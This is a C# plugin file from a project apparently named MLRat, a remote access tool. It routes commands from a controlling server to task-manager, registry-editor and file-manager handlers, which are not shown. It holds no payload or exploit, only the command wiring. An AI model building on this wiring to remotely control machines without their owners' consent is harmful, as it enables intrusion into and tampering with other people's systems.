using MLManagementClient.Handlers;
using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MLManagementClient
{
    public class ClientPlugin : IClientPlugin
    {
        IClientConnection NetworkHost = null;
        public void OnConnect()
        {
            
        }

        public void OnDataRecieved(object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];

            Console.WriteLine("NetworkCommand: {0}", command.ToString());

            if (command == NetworkCommand.TaskManager) TaskManagerHandler.Handle(data);
            if (command == NetworkCommand.Ping) NetworkHost.Send((byte)NetworkCommand.Pong);
            if (command == NetworkCommand.RegistryEdit) RegistryEditorHandler.Handle(data);
            if (command == NetworkCommand.FileManager) FileManagerHandler.Handle(data);
        }

        public void OnDisconnect()
        {
            
        }

        public void OnPluginLoad(IClientConnection server)
        {
            NetworkHost = server;
            TaskManagerHandler.SetNetworkHost(NetworkHost);
            RegistryEditorHandler.SetNetworkHost(NetworkHost);
            FileManagerHandler.SetNetworkHost(NetworkHost);
        }
    }
}
